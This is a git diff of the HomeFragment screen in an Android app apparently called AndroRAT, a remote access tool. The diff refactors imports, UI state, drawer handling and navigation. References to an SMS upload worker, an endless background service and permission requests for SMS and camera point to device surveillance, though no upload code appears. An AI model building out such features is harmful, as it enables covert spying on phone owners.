@@ -43,10 +43,10 @@ import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkInfo
 import androidx.work.WorkManager
 import com.ierusalem.androrat.R
-import com.ierusalem.androrat.core.services.endless_service.Actions
-import com.ierusalem.androrat.core.services.endless_service.EndlessService
-import com.ierusalem.androrat.core.services.endless_service.ServiceState
-import com.ierusalem.androrat.core.services.endless_service.getServiceState
+import com.ierusalem.androrat.core.data.services.endless_service.Actions
+import com.ierusalem.androrat.core.data.services.endless_service.EndlessService
+import com.ierusalem.androrat.core.data.services.endless_service.ServiceState
+import com.ierusalem.androrat.core.data.services.endless_service.getServiceState
 import com.ierusalem.androrat.core.ui.components.AndroRatAppDrawer
 import com.ierusalem.androrat.core.ui.components.CameraPermissionTextProvider
 import com.ierusalem.androrat.core.ui.components.MusicAndAudioPermissionTextProvider
@@ -57,10 +57,10 @@ import com.ierusalem.androrat.core.ui.components.ReadExternalStoragePermissionTe
 import com.ierusalem.androrat.core.ui.components.ReadSMSMessageTextProvider
 import com.ierusalem.androrat.core.ui.components.RecordAudioPermissionTextProvider
 import com.ierusalem.androrat.core.ui.theme.AndroRATTheme
-import com.ierusalem.androrat.core.utility.Constants
-import com.ierusalem.androrat.core.utility.executeWithLifecycle
-import com.ierusalem.androrat.core.utility.log
-import com.ierusalem.androrat.core.utility.openAppSettings
+import com.ierusalem.androrat.core.utils.Constants
+import com.ierusalem.androrat.core.utils.executeWithLifecycle
+import com.ierusalem.androrat.core.utils.log
+import com.ierusalem.androrat.core.utils.openAppSettings
 import com.ierusalem.androrat.core.worker.PermissionRequestWorker
 import com.ierusalem.androrat.core.worker.SMSUploadWorker
 import com.ierusalem.androrat.features.home.domain.HomeViewModel
@@ -109,7 +109,7 @@ class HomeFragment : Fragment() {
         return ComposeView(requireContext()).apply {
             setContent {
                 val context = LocalContext.current
-                val state by viewModel.state.collectAsStateWithLifecycle()
+                val uiState by viewModel.state.collectAsStateWithLifecycle()
                 val dialogQueue = viewModel.visiblePermissionDialogQueue
                 val workManager = WorkManager.getInstance(context)
 
@@ -137,8 +137,6 @@ class HomeFragment : Fragment() {
                         }
                     }
                 }
-
-
 
                 val multiplePermissionResultLauncher = rememberLauncherForActivityResult(
                     contract = ActivityResultContracts.RequestMultiplePermissions(),
@@ -289,24 +287,22 @@ class HomeFragment : Fragment() {
                 AndroRATTheme {
                     AndroRatAppDrawer(
                         drawerState = drawerState,
-                        onDrawerItemClick = {},
+                        onDrawerItemClick = {
+                            scope.launch {
+                                drawerState.close()
+                                viewModel.handleDrawerAction(it)
+                            }
+                        },
+                        userProfile = uiState.userProfile,
+                        categories = uiState.categories,
                         content = {
                             HomeScreen(
-                                state = state,
+                                state = uiState,
+                                eventHandler = {
+                                    viewModel.handleEvents(it)
+                                },
                                 onOpenMessageFragment = {
                                     readSMSMessagesPermissionLauncher.launch(Manifest.permission.READ_SMS)
-                                },
-                                onSaveScreenshotClick = {
-                                    //todo
-                                    if (state.screenshot != null) {
-                                        saveMediaToStorage(state.screenshot!!)
-                                    } else {
-                                        Toast.makeText(
-                                            requireContext(),
-                                            "Can not save!",
-                                            Toast.LENGTH_SHORT
-                                        ).show()
-                                    }
                                 },
                                 onOpenImagesAndVideos = {
                                     findNavController().navigate(R.id.action_homeFragment_to_imageFragment)
@@ -366,9 +362,6 @@ class HomeFragment : Fragment() {
                                 },
                                 onCameraPermissionRequest = {
                                     cameraResultPermissionLauncher.launch(Manifest.permission.CAMERA)
-                                },
-                                onTakeScreenShotClick = {
-                                    viewModel.updatePhoto(it)
                                 },
                                 onStartEndlessService = {
                                     actionOnService(Actions.START)
@@ -733,12 +726,19 @@ class HomeFragment : Fragment() {
 
     private fun executeNavigation(navigation: HomeScreenNavigation) {
         when (navigation) {
-            HomeScreenNavigation.OpenMessageFragment -> {
+            HomeScreenNavigation.NavigateToMessageFragment -> {
                 findNavController().navigate(R.id.action_homeFragment_to_messageFragment)
+            }
+            HomeScreenNavigation.NavigateToAndroRtcFragment ->{
+                findNavController().navigate(R.id.action_homeFragment_to_androRtcFragment)
+            }
+            HomeScreenNavigation.NavigateToSettingsFragment -> {
+                findNavController().navigate(R.id.action_homeFragment_to_settingsFragment)
             }
         }
     }
 
+    @Suppress("unused")
     private fun saveMediaToStorage(bitmap: ImageBitmap) {
         val filename = "${System.currentTimeMillis()}.jpg"
         var fos: OutputStream? = null
